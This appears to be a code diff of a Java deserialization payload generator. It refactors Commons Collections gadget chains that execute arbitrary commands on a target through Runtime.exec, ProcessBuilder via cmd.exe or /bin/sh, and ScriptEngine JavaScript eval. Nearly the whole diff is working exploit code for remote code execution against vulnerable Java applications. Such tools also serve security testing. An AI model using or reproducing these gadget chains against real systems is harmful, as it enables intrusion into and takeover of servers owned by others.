@@ -31,101 +31,90 @@ public class InvokerTransformer4 {
      * @param sinksHelper
      * @return
      */
-    @EnchantType({EnchantType.RUNTIME, EnchantType.DEFAULT})
+    @EnchantType({EnchantType.Command, EnchantType.DEFAULT})
     public Transformer[] runtime(SinksHelper sinksHelper) {
         String command = sinksHelper.getCommand();
-        Printer.yellowInfo("command: " + command);
-
-        return new Transformer[]{
-                new ConstantTransformer(Runtime.class),
-                new InvokerTransformer("getMethod", new Class[]{
-                        String.class, Class[].class}, new Object[]{
-                        "getRuntime", new Class[0]}),
-                new InvokerTransformer("invoke", new Class[]{
-                        Object.class, Object[].class}, new Object[]{
-                        null, new Object[0]}),
-                new InvokerTransformer("exec",
-                        new Class[]{String.class}, new Object[]{command}),
-                new ConstantTransformer(1)};
-    }
-
-    /**
-     * 命令执行 ProcessBuilder
-     *
-     * @param sinksHelper
-     * @return
-     */
-    @EnchantType({EnchantType.ProcessBuilder})
-    public Transformer[] processBuilder(SinksHelper sinksHelper) {
-        String command = sinksHelper.getCommand();
+        EnchantEnums commandType = sinksHelper.getCommandType();
         EnchantEnums os = sinksHelper.getOs();
+        String code = sinksHelper.getCode();
+        String codeFile = sinksHelper.getCodeFile();
+
+        Printer.blueInfo("command type: " + commandType);
         Printer.yellowInfo("command: " + command);
 
         Transformer[] transformers = new Transformer[0];
-        if (os != null && os.equals(EnchantEnums.WIN)) {
-            Printer.yellowInfo("os: " + os);
-            transformers = new Transformer[]{
-                    new ConstantTransformer(ProcessBuilder.class),
-                    new InvokerTransformer("getDeclaredConstructor", new Class[]{
-                            Class[].class}, new Object[]{new Class[]{String[].class}}),
-                    new InvokerTransformer("newInstance", new Class[]{
-                            Object[].class}, new Object[]{new Object[]{new String[]{"cmd.exe", "/c", command}}}),
-                    new InvokerTransformer("start", new Class[]{}, new Object[]{}),
-                    new ConstantTransformer(1)};
-        } else {
-            transformers = new Transformer[]{
-                    new ConstantTransformer(ProcessBuilder.class),
-                    new InvokerTransformer("getDeclaredConstructor", new Class[]{
-                            Class[].class}, new Object[]{new Class[]{String[].class}}),
-                    new InvokerTransformer("newInstance", new Class[]{
-                            Object[].class}, new Object[]{new Object[]{new String[]{"/bin/sh", "-c", command}}}),
-                    new InvokerTransformer("start", new Class[]{}, new Object[]{}),
-                    new ConstantTransformer(1)};
+        switch (commandType) {
+            default:
+            case Runtime:
+                transformers = new Transformer[]{
+                        new ConstantTransformer(Runtime.class),
+                        new InvokerTransformer("getMethod", new Class[]{
+                                String.class, Class[].class}, new Object[]{
+                                "getRuntime", new Class[0]}),
+                        new InvokerTransformer("invoke", new Class[]{
+                                Object.class, Object[].class}, new Object[]{
+                                null, new Object[0]}),
+                        new InvokerTransformer("exec",
+                                new Class[]{String.class}, new Object[]{command}),
+                        new ConstantTransformer(1)};
+                break;
+
+            case ProcessBuilder:
+                if (os != null && os.equals(EnchantEnums.WIN)) {
+                    Printer.yellowInfo("os: " + os);
+                    transformers = new Transformer[]{
+                            new ConstantTransformer(ProcessBuilder.class),
+                            new InvokerTransformer("getDeclaredConstructor", new Class[]{
+                                    Class[].class}, new Object[]{new Class[]{String[].class}}),
+                            new InvokerTransformer("newInstance", new Class[]{
+                                    Object[].class}, new Object[]{new Object[]{new String[]{"cmd.exe", "/c", command}}}),
+                            new InvokerTransformer("start", new Class[]{}, new Object[]{}),
+                            new ConstantTransformer(1)};
+                } else {
+                    transformers = new Transformer[]{
+                            new ConstantTransformer(ProcessBuilder.class),
+                            new InvokerTransformer("getDeclaredConstructor", new Class[]{
+                                    Class[].class}, new Object[]{new Class[]{String[].class}}),
+                            new InvokerTransformer("newInstance", new Class[]{
+                                    Object[].class}, new Object[]{new Object[]{new String[]{"/bin/sh", "-c", command}}}),
+                            new InvokerTransformer("start", new Class[]{}, new Object[]{}),
+                            new ConstantTransformer(1)};
+                }
+                break;
+
+            case ScriptEngine:
+                if (codeFile != null) {
+                    try {
+                        FileInputStream fileInputStream = new FileInputStream(codeFile);
+                        byte[] codeBytes = new byte[fileInputStream.available()];
+                        fileInputStream.read(codeBytes);
+                        fileInputStream.close();
+                        code = new String(codeBytes);
+                    } catch (Exception e) {
+                        Printer.error("File read error");
+                    }
+                }
+                if (code == null) {
+                    code = String.format("java.lang.Runtime.getRuntime().exec(\"%s\")", command);
+                    Printer.blueInfo("use default code template: " + code);
+                }
+                // 模板替换 -cmd -> [ppp]
+                code = code.replaceAll("\\[ppp\\]", command);
+
+                Printer.yellowInfo(String.format("js code is: %s", code));
+
+                transformers = new Transformer[]{
+                        new ConstantTransformer(ScriptEngineManager.class),
+                        new InstantiateTransformer(new Class[]{}, new Object[]{}),
+                        new InvokerTransformer("getEngineByName", new Class[]{
+                                String.class}, new Object[]{"JavaScript"}),
+                        new InvokerTransformer("eval", new Class[]{
+                                String.class}, new Object[]{code}),
+                        new ConstantTransformer(1)};
+                break;
         }
 
         return transformers;
-    }
-
-    /**
-     * ScriptEngine
-     *
-     * @param sinksHelper
-     * @return
-     */
-    @EnchantType({EnchantType.ScriptEngine})
-    public Transformer[] scriptEngine(SinksHelper sinksHelper) {
-        String command = sinksHelper.getCommand();
-        String code = sinksHelper.getCode();
-        String codeFile = sinksHelper.getCodeFile();
-        if (code == null) {
-            code = String.format("java.lang.Runtime.getRuntime().exec(\"%s\")", command);
-        }
-
-        if (codeFile != null) {
-            try {
-                FileInputStream fileInputStream = new FileInputStream(codeFile);
-                byte[] codeBytes = new byte[fileInputStream.available()];
-                fileInputStream.read(codeBytes);
-                fileInputStream.close();
-                code = new String(codeBytes);
-            } catch (Exception e) {
-                Printer.error("File read error");
-            }
-        }
-
-        // 模板替换 -cmd -> [ppp]
-        code = code.replaceAll("\\[ppp\\]", command);
-
-        Printer.yellowInfo(String.format("js code is: %s", code));
-
-        return new Transformer[]{
-                new ConstantTransformer(ScriptEngineManager.class),
-                new InstantiateTransformer(new Class[]{}, new Object[]{}),
-                new InvokerTransformer("getEngineByName", new Class[]{
-                        String.class}, new Object[]{"JavaScript"}),
-                new InvokerTransformer("eval", new Class[]{
-                        String.class}, new Object[]{code}),
-                new ConstantTransformer(1)};
     }
 
     /**
